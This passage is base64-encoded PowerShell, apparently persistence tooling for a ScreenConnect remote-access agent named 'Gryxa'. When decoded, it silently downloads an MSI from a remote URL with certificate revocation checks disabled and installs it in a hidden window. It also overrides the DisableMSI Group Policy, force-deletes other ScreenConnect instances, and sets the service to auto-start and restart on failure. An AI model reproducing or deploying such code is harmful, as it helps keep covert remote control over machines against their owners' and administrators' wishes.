ZXJwcmludCkiKSkgeyByZXR1cm4gJHRydWUgfQogICAgfQogICAgcmV0dXJuICRmYWxzZQp9Cgpm
dW5jdGlvbiBGaW5kLVJ1bm5pbmdHcnl4YUZwIHsKICAgICMgQU5ZIG5vbi1zZXZyeiBTY3JlZW5D
b25uZWN0IENsaWVudCB0aGF0IGlzIFJ1bm5pbmcvc3RhcnRpbmcgY291bnRzIGFzIEdyeXhhLgog
ICAgIyBEbyBOT1QgcmVxdWlyZSByZWxheS1zdHJpbmcgc2NhbiAoZmFsc2UgbmVnYXRpdmVzIGNh
dXNlZCByZWluc3RhbGwgbG9vcHMpLgogICAgJGNmZyA9IEdldC1Hcnl4YUZwCiAgICBpZiAoVGVz
dC1TY1J1bm5pbmcgJGNmZykgeyByZXR1cm4gJGNmZyB9CiAgICBmb3JlYWNoICgkc3ZjIGluIChH
ZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSkpIHsKICAgICAgICBpZiAoJHN2Yy5TdGF0dXMgLW5vdGluIEAoJ1J1bm5p
bmcnLCAnU3RhcnRQZW5kaW5nJywgJ0NvbnRpbnVlUGVuZGluZycpKSB7IGNvbnRpbnVlIH0KICAg
ICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJykgewogICAgICAg
ICAgICAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkKICAgICAgICAgICAgaWYgKCRmcCAtaW4g
JHNjcmlwdDpTZXZyektlZXApIHsgY29udGludWUgfQogICAgICAgICAgICByZXR1cm4gJGZwCiAg
ICAgICAgfQogICAgfQogICAgcmV0dXJuICRudWxsCn0KCmZ1bmN0aW9uIFRlc3QtQW55Tm9uU2V2
cnpTY1J1bm5pbmcgewogICAgcmV0dXJuIFtib29sXShGaW5kLVJ1bm5pbmdHcnl4YUZwKQp9Cgpm
dW5jdGlvbiBUZXN0LUdyeXhhSGVhbHRoIHsKICAgICMgTE9DQUwgaGVhbHRoIG9ubHkuIFRDUC9y
ZWxheSBuZXZlciBtYXJrIFVOSEVBTFRIWSAoYXZvaWRzIHBhbmVsIGR1cGxpY2F0ZXMpLgogICAg
JGZwID0gR2V0LUdyeXhhRnAKICAgICRydW5uaW5nRnAgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwCiAg
ICBpZiAoJHJ1bm5pbmdGcCkgewogICAgICAgIGlmICgkcnVubmluZ0ZwIC1uZSAkZnApIHsgU2V0
LUdyeXhhRnAgJHJ1bm5pbmdGcDsgJGZwID0gJHJ1bm5pbmdGcCB9CiAgICAgICAgJHRjcFJlbGF5
ID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhUmVsYXlIb3N0IDQ0MwogICAgICAgICR0
Y3BVaSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVVpSG9zdCA0NDMKICAgICAgICBy
ZXR1cm4gIkhFQUxUSFl8JGZwfHJ1bm5pbmc9MXxyZWxheT0kdGNwUmVsYXl8dWk9JHRjcFVpIgog
ICAgfQoKICAgICRyZWFzb25zID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp
Yy5MaXN0W3N0cmluZ10KICAgIGlmICgtbm90IChUZXN0LVNjUnVubmluZyAkZnApKSB7CiAgICAg
ICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICJTY3JlZW5Db25uZWN0IENsaWVudCAoJGZwKSIg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICBpZiAoLW5vdCAkc3ZjKSB7IFt2
b2lkXSRyZWFzb25zLkFkZCgnc3ZjLW1pc3NpbmcnKSB9CiAgICAgICAgZWxzZSB7IFt2b2lkXSRy
ZWFzb25zLkFkZCgic3ZjLSQoJHN2Yy5TdGF0dXMpIikgfQogICAgfQogICAgaWYgKC1ub3QgKFRl
c3QtU2NEaXIgJGZwKSAtYW5kIC1ub3QgKEZpbmQtUHJvZHVjdEd1aWQgJGZwKSkgewogICAgICAg
IFt2b2lkXSRyZWFzb25zLkFkZCgnbm90LWluc3RhbGxlZCcpCiAgICB9CgogICAgJHRjcFJlbGF5
ID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhUmVsYXlIb3N0IDQ0MwogICAgJHRjcFVp
ID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhVWlIb3N0IDQ0MwogICAgaWYgKCRyZWFz
b25zLkNvdW50IC1lcSAwKSB7CiAgICAgICAgIyByZWdpc3RlcmVkL2RpciBwcmVzZW50IGJ1dCBz
ZXJ2aWNlIG5vdCBydW5uaW5nIOKAlCBzdGlsbCB1bmhlYWx0aHkgZm9yIHN0YXJ0L3JlcGFpcgog
ICAgICAgIGlmICgtbm90IChUZXN0LVNjUnVubmluZyAkZnApKSB7CiAgICAgICAgICAgIHJldHVy
biAiVU5IRUFMVEhZfCRmcHxzdmMtbm90LXJ1bm5pbmd8cmVsYXk9JHRjcFJlbGF5fHVpPSR0Y3BV
aSIKICAgICAgICB9CiAgICAgICAgcmV0dXJuICJIRUFMVEhZfCRmcHxyZWxheT0kdGNwUmVsYXl8
dWk9JHRjcFVpIgogICAgfQogICAgcmV0dXJuICJVTkhFQUxUSFl8JGZwfCQoJHJlYXNvbnMgLWpv
aW4gJywnKXxyZWxheT0kdGNwUmVsYXl8dWk9JHRjcFVpIgp9CgpmdW5jdGlvbiBUZXN0LUdyeXhh
UmVpbnN0YWxsQWxsb3dlZCB7CiAgICAjIE1heCBvbmUgY2h1cm4tcmVpbnN0YWxsIHBlciA3ZCB1
bmxlc3MgLUZvcmNlLgogICAgIyBPNDI6IE5FVkVSIGJsb2NrIHdoZW4gR3J5eGEgaXMgZnVsbHkg
YWJzZW50IChzdmMrcHJvZHVjdCtkaXIgZ29uZSkuCiAgICAkZnAgPSBHZXQtR3J5eGFGcAogICAg
JHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICJTY3JlZW5Db25uZWN0IENsaWVudCAoJGZwKSIgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIGlmICgtbm90ICRzdmMgLWFuZCAtbm90IChG
aW5kLVJ1bm5pbmdHcnl4YUZwKSAtYW5kIC1ub3QgKEZpbmQtUHJvZHVjdEd1aWQgJGZwKSAtYW5k
IC1ub3QgKFRlc3QtU2NEaXIgJGZwKSkgewogICAgICAgIHJldHVybiAkdHJ1ZQogICAgfQogICAg
JGZsYWcgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX3JlaW5zdGFsbC5mbGFnJwogICAgaWYg
KC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGZsYWcpKSB7IHJldHVybiAkdHJ1ZSB9CiAg
ICB0cnkgewogICAgICAgICRhZ2UgPSAoR2V0LURhdGUpIC0gKEdldC1JdGVtIC1MaXRlcmFsUGF0
aCAkZmxhZykuTGFzdFdyaXRlVGltZQogICAgICAgIHJldHVybiAoJGFnZS5Ub3RhbEhvdXJzIC1n
ZSAxNjgpCiAgICB9IGNhdGNoIHsgcmV0dXJuICR0cnVlIH0KfQoKZnVuY3Rpb24gTWFyay1Hcnl4
YVJlaW5zdGFsbCB7CiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29y
a0RpciAnZ3J5eGFfcmVpbnN0YWxsLmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlKS5Ub1VuaXZlcnNh
bFRpbWUoKS5Ub1N0cmluZygnbycpIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UKfQoKZnVuY3Rpb24g
VW5pbnN0YWxsLVNjRmluZ2VycHJpbnQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgIGlmICgt
bm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRndWlkID0gRmluZC1Qcm9kdWN0R3Vp
ZCAkRmluZ2VycHJpbnQKICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1cU09GVFdBUkVcUG9saWNp
ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC9mIDI+JjEgfCBP
dXQtTnVsbAogICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3Nv
ZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JEIC9kIDAgL2Yg
Mj4mMSB8IE91dC1OdWxsCiAgICBpZiAoJGd1aWQpIHsKICAgICAgICAkcCA9IFN0YXJ0LVByb2Nl
c3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9ub3Jlc3RhcnQgUkVC
T09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgog
ICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYKICAgIH0KICAgICRzdmMgPSBHZXQtU2Vydmlj
ZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMp
IHsKICAgICAgICAmIHNjLmV4ZSBzdG9wICRuYW1lIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICYg
c2MuZXhlIGRlbGV0ZSAkbmFtZSAyPiYxIHwgT3V0LU51bGwKICAgICAgICBTdGFydC1TbGVlcCAt
U2Vjb25kcyAyCiAgICB9CiAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfSwgJGVudjpQcm9ncmFtRmlsZXMpKSB7CiAgICAgICAgJGQgPSBKb2luLVBhdGggJGJh
c2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIgogICAgICAgIGlmIChUZXN0
LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7CiAgICAgICAgICAgICYgdGFrZW93bi5leGUgL0YgJGQg
L1IgL0QgWSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQ
YXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAg
ICAgIH0KICAgIH0KICAgIHJldHVybiAncmVtb3ZlZCcKfQoKZnVuY3Rpb24gSW5zdGFsbC1Hcnl4
YUZyb21Nc2koW3N0cmluZ10kTXNpUGF0aCkgewogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxT
T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVN
U0kgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBv
bGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdf
RFdPUkQgL2QgMCAvZiAyPiYxIHwgT3V0LU51bGwKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtE
aXIgJ21zaV9ncnl4YV9lbnN1cmUubG9nJwogICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMu
ZXhlIC1Bcmd1bWVudExpc3QgIi9pIGAiJE1zaVBhdGhgIiAvcW4gL25vcmVzdGFydCBBTExVU0VS
Uz0xIFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2IGAiJGxvZ2AiIiAtV2FpdCAtUGFzc1RocnUg
LVdpbmRvd1N0eWxlIEhpZGRlbgogICAgJGV4aXQgPSAkcC5FeGl0Q29kZQogICAgaWYgKCRleGl0
IC1lcSAxNjE4KSB7CiAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMzAKICAgICAgICAkcCA9
IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2kgYCIkTXNpUGF0aGAi
IC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgYCIk
bG9nYCIiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAgJGV4aXQg
PSAkcC5FeGl0Q29kZQogICAgfQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMTAKICAgIHJldHVy
biAkZXhpdAp9CgpmdW5jdGlvbiBJbnZva2UtR3J5eGFFbnN1cmUgewogICAgIyBPNDAgSEFSRCBS
VUxFOiBpZiBBTlkgbm9uLXNldnJ6IFNjcmVlbkNvbm5lY3QgaXMgUnVubmluZyAtPiBORVZFUiAv
eCBvciAvaS4KICAgICMgTzQzOiBBTFdBWVMgdHJ5IHN0YXJ0L3JlcGFpciBCRUZPUkUgcmF0ZS1s
aW1pdDsgLURlZXAgbXVzdCBub3Qgc2tpcCBsaWdodCBoZWFsCiAgICAjIChtb24gZGVlcCB0aWNr
cyB3ZXJlIHJhdGUtbGltaXRpbmcgZm9yZXZlciB3aGlsZSBHcnl4YSBzdGF5ZWQgU3RvcHBlZCku
CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsKICAgICAg
ICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3JjZSB8IE91
dC1OdWxsCiAgICB9CiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9lbnN1cmUu
bG9nJwogICAgZnVuY3Rpb24gR0xvZyhbc3RyaW5nXSRtKSB7CiAgICAgICAgJGxpbmUgPSAnezB9
IHsxfScgLWYgKEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0KICAg
ICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgJGxpbmUgLUVycm9yQWN0
aW9uIFNpbGVudGx5Q29udGludWUKICAgIH0KCiAgICAkb2xkRnAgPSBHZXQtR3J5eGFGcAogICAg
JGRvRGVlcCA9IFtib29sXSgkRGVlcCAtb3IgJEZvcmNlIC1vciAoJEV4dHJhIC1tYXRjaCAnKD9p
KWRlZXB8Zm9yY2UnKSkKICAgIEdMb2cgImdyeXhhX2Vuc3VyZV9iZWdpbiBkZWVwPSRkb0RlZXAg
Zm9yY2U9JEZvcmNlIG9sZF9mcD0kb2xkRnAiCgogICAgJHJ1bm5pbmdGcCA9IEZpbmQtUnVubmlu
Z0dyeXhhRnAKICAgIGlmICgkcnVubmluZ0ZwKSB7CiAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5p
bmdGcAogICAgICAgIEdMb2cgImFscmVhZHlfcnVubmluZ19mcD0kcnVubmluZ0ZwIGxvY2tfbm9f
cmVpbnN0YWxsIgogICAgICAgIGlmICgtbm90ICRGb3JjZSkgewogICAgICAgICAgICBpZiAoJGRv
RGVlcCkgewogICAgICAgICAgICAgICAgJG1zaSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnX2dy
eXhhLm1zaScKICAgICAgICAgICAgICAgICR0bXAgPSBKb2luLVBhdGggJGVudjpURU1QICgic2Nf
Z3J5eGFfezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoJ04nKSkKICAgICAg
ICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJGN1cmwgPSBKb2luLVBhdGggJGVu
djpTeXN0ZW1Sb290ICdTeXN0ZW0zMlxjdXJsLmV4ZScKICAgICAgICAgICAgICAgICAgICBpZiAo
LW5vdCAoVGVzdC1QYXRoICRjdXJsKSkgeyAkY3VybCA9ICdjdXJsLmV4ZScgfQogICAgICAgICAg
ICAgICAgICAgICYgJGN1cmwgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDI1
IC0tbWF4LXRpbWUgMzAwIC1vICR0bXAgJHNjcmlwdDpHcnl4YU1zaVVybCAyPiYxIHwgT3V0LU51
bGwKICAgICAgICAgICAgICAgICAgICBpZiAoKFRlc3QtUGF0aCAkdG1wKSAtYW5kICgoR2V0LUl0
ZW0gJHRtcCkuTGVuZ3RoIC1ndCAxMDAwMDAwKSkgewogICAgICAgICAgICAgICAgICAgICAgICBD
b3B5LUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLURlc3RpbmF0aW9uICRtc2kgLUZvcmNlCiAgICAg
ICAgICAgICAgICAgICAgICAgICRwcm9kTmFtZSA9IEdldC1Nc2lQcm9wZXJ0eSAkbXNpICdQcm9k
dWN0TmFtZScKICAgICAgICAgICAgICAgICAgICAgICAgJG5ld0ZwID0gR2V0LUZwRnJvbVByb2R1
Y3ROYW1lICRwcm9kTmFtZQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJG5ld0ZwIC1hbmQg
KCRuZXdGcCAtbmUgJHJ1bm5pbmdGcCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdM
b2cgImZwX2RyaWZ0X0lHTk9SRURfd2hpbGVfcnVubmluZyBydW5uaW5nPSRydW5uaW5nRnAgbXNp
PSRuZXdGcCIKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAg
ICAgICAgICAgICAgIEdMb2cgImRlZXBfZnBfbWF0Y2g9JHJ1bm5pbmdGcCIKICAgICAgICAgICAg
ICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gY2F0
Y2ggeyBHTG9nICJkZWVwX21zaV9zb2Z0ZmFpbD0kXyIgfQogICAgICAgICAgICAgICAgZmluYWxs
eSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkdG1wIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICJIRUFMVEhZ
fCRydW5uaW5nRnB8cnVubmluZz0xfG5vLXJlaW5zdGFsbCIKICAgICAgICB9CiAgICAgICAgR0xv
ZyAnZm9yY2VfcmVpbnN0YWxsX2Rlc3BpdGVfcnVubmluZycKICAgIH0KCiAgICAjIE80MzogbGln
aHQgaGVhbCBBTFdBWVMgKGV2ZW4gdW5kZXIgLURlZXApIOKAlCBzdGFydC9yZXBhaXIgbmV2ZXIg
cmF0ZS1saW1pdGVkCiAgICAkZnBUcnkgPSAkb2xkRnAKICAgIGlmIChUZXN0LVNjUnVubmluZyAk
ZnBUcnkpIHsKICAgICAgICBTZXQtR3J5eGFGcCAkZnBUcnkKICAgICAgICByZXR1cm4gIkhFQUxU
SFl8JGZwVHJ5fHJ1bm5pbmc9MSIKICAgIH0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xp
ZW50ICgkZnBUcnkpIgogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2YykgewogICAgICAgIEdMb2cgImxpZ2h0
X3N0YXJ0X2F0dGVtcHQgc3RhdHVzPSQoJHN2Yy5TdGF0dXMpIgogICAgICAgICYgc2MuZXhlIGNv
bmZpZyAkbmFtZSBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIHNjLmV4ZSBm
YWlsdXJlICRuYW1lIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8z
MDAwL3Jlc3RhcnQvMzAwMCAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIHNjLmV4ZSBzdGFydCAk
bmFtZSAyPiYxIHwgT3V0LU51bGwKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1CiAgICAg
ICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgU3RhcnQtU2xl
ZXAgLVNlY29uZHMgMwogICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkZnBUcnkpIHsKICAgICAg
ICAgICAgU2V0LUdyeXhhRnAgJGZwVHJ5CiAgICAgICAgICAgIEdMb2cgJ2xpZ2h0X3N0YXJ0ZWRf
b2snCiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkZnBUcnl8c3RhcnRlZD0xIgogICAgICAg
IH0KICAgIH0KICAgIGlmIChGaW5kLVByb2R1Y3RHdWlkICRmcFRyeSkgewogICAgICAgIEdMb2cg
J2xpZ2h0X3JlcGFpcl9hdHRlbXB0JwogICAgICAgICRudWxsID0gUmVwYWlyLVNDU2VydmljZSAk
ZnBUcnkKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA0CiAgICAgICAgaWYgKFRlc3QtU2NS
dW5uaW5nICRmcFRyeSkgewogICAgICAgICAgICBTZXQtR3J5eGFGcCAkZnBUcnkKICAgICAgICAg
ICAgR0xvZyAnbGlnaHRfcmVwYWlyZWRfb2snCiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwk
ZnBUcnl8cmVwYWlyZWQ9MSIKICAgICAgICB9CiAgICB9CiAgICAkcnVubmluZ0ZwID0gRmluZC1S
dW5uaW5nR3J5eGFGcAogICAgaWYgKCRydW5uaW5nRnApIHsKICAgICAgICBTZXQtR3J5eGFGcCAk
cnVubmluZ0ZwCiAgICAgICAgR0xvZyAibGlnaHRfZm91bmRfb3RoZXJfcnVubmluZz0kcnVubmlu
Z0ZwIgogICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxkaXNjb3Zl
cmVkIgogICAgfQoKICAgIGlmICgtbm90ICRGb3JjZSAtYW5kIChUZXN0LUFueU5vblNldnJ6U2NS
dW5uaW5nKSkgewogICAgICAgICRydW5uaW5nRnAgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwCiAgICAg
ICAgU2V0LUdyeXhhRnAgJHJ1bm5pbmdGcAogICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmlu
Z0ZwfHJ1bm5pbmc9MXxndWFyZCIKICAgIH0KCiAgICAjIG1zaWV4ZWMgcGF0aCBvbmx5IGZyb20g
aGVyZSDigJQgcmF0ZS1saW1pdCBhcHBsaWVzICh1bmxlc3MgLUZvcmNlIC8gZnVsbHkgYWJzZW50
KQogICAgaWYgKC1ub3QgJEZvcmNlIC1hbmQgLW5vdCAoVGVzdC1Hcnl4YVJlaW5zdGFsbEFsbG93
ZWQpKSB7CiAgICAgICAgR0xvZyAncmVpbnN0YWxsX3JhdGVfbGltaXRlZCcKICAgICAgICByZXR1
cm4gIlVOSEVBTFRIWXwkb2xkRnB8cmF0ZS1saW1pdGVkIgogICAgfQoKICAgICRtc2kgPSBKb2lu
LVBhdGggJFdvcmtEaXIgJ3BrZ19ncnl4YS5tc2knCiAgICAkdG1wID0gSm9pbi1QYXRoICRlbnY6
VEVNUCAoInNjX2dyeXhhX3swfS5tc2kiIC1mIFtndWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCdO
JykpCiAgICAkZmV0Y2hlZCA9ICRmYWxzZQogICAgdHJ5IHsKICAgICAgICAkY3VybCA9IEpvaW4t
UGF0aCAkZW52OlN5c3RlbVJvb3QgJ1N5c3RlbTMyXGN1cmwuZXhlJwogICAgICAgIGlmICgtbm90
IChUZXN0LVBhdGggJGN1cmwpKSB7ICRjdXJsID0gJ2N1cmwuZXhlJyB9CiAgICAgICAgJiAkY3Vy
bCAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1tYXgtdGltZSAzMDAg
LW8gJHRtcCAkc2NyaXB0OkdyeXhhTXNpVXJsIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIGlmICgo
VGVzdC1QYXRoICR0bXApIC1hbmQgKChHZXQtSXRlbSAkdG1wKS5MZW5ndGggLWd0IDEwMDAwMDAp
KSB7CiAgICAgICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJHRtcCAtRGVzdGluYXRpb24g
JG1zaSAtRm9yY2UKICAgICAgICAgICAgJGZldGNoZWQgPSAkdHJ1ZQogICAgICAgICAgICBHTG9n
ICgibXNpX2ZldGNoZWQgYnl0ZXM9ezB9IiAtZiAoR2V0LUl0ZW0gJG1zaSkuTGVuZ3RoKQogICAg
ICAgIH0KICAgIH0gY2F0Y2ggeyBHTG9nICJtc2lfZmV0Y2hfZXJyPSRfIiB9CiAgICBmaW5hbGx5
IHsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICR0bXAgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlIH0KCiAgICBpZiAoLW5vdCAkZmV0Y2hlZCAtYW5kIChUZXN0LVBhdGggJG1z
aSkgLWFuZCAoKEdldC1JdGVtICRtc2kpLkxlbmd0aCAtZ3QgMTAwMDAwMCkpIHsKICAgICAgICAk
ZmV0Y2hlZCA9ICR0cnVlCiAgICAgICAgR0xvZyAnbXNpX3VzaW5nX2NhY2hlJwogICAgfQogICAg
aWYgKC1ub3QgJGZldGNoZWQpIHsKICAgICAgICBHTG9nICdtc2lfZmV0Y2hfRkFJTCcKICAgICAg
ICByZXR1cm4gIlVOSEVBTFRIWXwkb2xkRnB8bXNpLWZldGNoLWZhaWwiCiAgICB9CgogICAgJHBy
b2ROYW1lID0gR2V0LU1zaVByb3BlcnR5ICRtc2kgJ1Byb2R1Y3ROYW1lJwogICAgJG5ld0ZwID0g
R2V0LUZwRnJvbVByb2R1Y3ROYW1lICRwcm9kTmFtZQogICAgaWYgKC1ub3QgJG5ld0ZwKSB7CiAg
ICAgICAgR0xvZyAibXNpX2ZwX3BhcnNlX0ZBSUwgbmFtZT0kcHJvZE5hbWUiCiAgICAgICAgcmV0
dXJuICJVTkhFQUxUSFl8JG9sZEZwfG1zaS1mcC1wYXJzZS1mYWlsIgogICAgfQogICAgR0xvZyAi
bXNpX2ZwPSRuZXdGcCBwcm9kdWN0PSRwcm9kTmFtZSIKCiAgICBpZiAoLW5vdCAkRm9yY2UgLWFu
ZCAoVGVzdC1BbnlOb25TZXZyelNjUnVubmluZykpIHsKICAgICAgICAkcnVubmluZ0ZwID0gRmlu
ZC1SdW5uaW5nR3J5eGFGcAogICAgICAgIFNldC1Hcnl4YUZwICRydW5uaW5nRnAKICAgICAgICBH
TG9nICdhYm9ydF9pbnN0YWxsX2JlY2FtZV9ydW5uaW5nJwogICAgICAgIHJldHVybiAiSEVBTFRI
WXwkcnVubmluZ0ZwfHJ1bm5pbmc9MXxhYm9ydC1pbnN0YWxsIgogICAgfQoKICAgIE1hcmstR3J5
eGFSZWluc3RhbGwKICAgIGlmIChGaW5kLVByb2R1Y3RHdWlkICRuZXdGcCkgewogICAgICAgIEdM
b2cgInJlcGFpcl9iZWZvcmVfaW5zdGFsbD0kbmV3RnAiCiAgICAgICAgJG51bGwgPSBSZXBhaXIt
U0NTZXJ2aWNlICRuZXdGcAogICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkbmV3RnApIHsKICAg
ICAgICAgICAgU2V0LUdyeXhhRnAgJG5ld0ZwCiAgICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwk
bmV3RnB8cmVwYWlyZWQ9MSIKICAgICAgICB9CiAgICAgICAgR0xvZyAidW5pbnN0YWxsX3N0dWNr
PSRuZXdGcCIKICAgICAgICAkbnVsbCA9IFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50ICRuZXdGcAog
ICAgfQogICAgaWYgKCRvbGRGcCAtYW5kICRvbGRGcCAtbmUgJG5ld0ZwIC1hbmQgKEZpbmQtUHJv
ZHVjdEd1aWQgJG9sZEZwKSkgewogICAgICAgIEdMb2cgInVuaW5zdGFsbF9vbGRfY2ZnPSRvbGRG
cCIKICAgICAgICAkbnVsbCA9IFVuaW5zdGFsbC1TY0ZpbmdlcnByaW50ICRvbGRGcAogICAgfQoK
ICAgIFNldC1Hcnl4YUZwICRuZXdGcAogICAgJGV4aXQgPSBJbnN0YWxsLUdyeXhhRnJvbU1zaSAk
bXNpCiAgICBHTG9nICJtc2lleGVjX2V4aXQ9JGV4aXQiCgogICAgJG5hbWUgPSAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCRuZXdGcCkiCiAgICAmIHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1
dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4ZSBmYWlsdXJlICRuYW1lIHJlc2V0PSA4NjQw
MCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8zMDAwL3Jlc3RhcnQvMzAwMCAyPiYxIHwg
T3V0LU51bGwKICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+JjEgfCBPdXQtTnVsbAogICAgU3Rh
cnQtU2xlZXAgLVNlY29uZHMgNQogICAgJiBzYy5leGUgc3RhcnQgJG5hbWUgMj4mMSB8IE91dC1O
